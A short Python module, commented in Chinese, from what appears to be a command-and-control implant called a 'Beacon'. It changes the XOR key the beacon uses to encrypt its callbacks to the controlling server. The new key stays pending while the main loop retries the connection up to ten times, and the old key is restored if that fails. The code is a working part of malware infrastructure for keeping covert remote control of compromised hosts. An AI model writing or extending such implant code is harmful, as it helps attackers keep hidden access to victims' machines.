"""
@module: set_key
@desc: 修改 Beacon XOR 密钥(验证后生效,失败自动回退;需同步更新 Server 配置)
"""
MODULE = {
    "desc": "修改 Beacon XOR 密钥(最多回连验证 10 次,失败自动回退)",
    "params": [("key_hex", "必填，64 字符 hex")],
}


def run(key_hex):
    """新密钥先写入 _SET_PENDING, 主循环用新密钥回连验证:
    成功(welcome)即生效; 连续 10 次失败回退原密钥。"""
    _k = bytes.fromhex(key_hex)
    _sp = globals().get("_SET_PENDING")
    if not isinstance(_sp, dict):
        _sp = {}
    _sp["key"] = _k
    globals()["_SET_PENDING"] = _sp
    globals()["_SET_TRY"] = 0
    return (f"pending key {len(_k)}B——接下来最多回连验证 10 次, "
            f"成功即生效, 失败自动回退原密钥")


if __name__ == "__main__":
    print("usage: set_key <64-char-hex-key>")
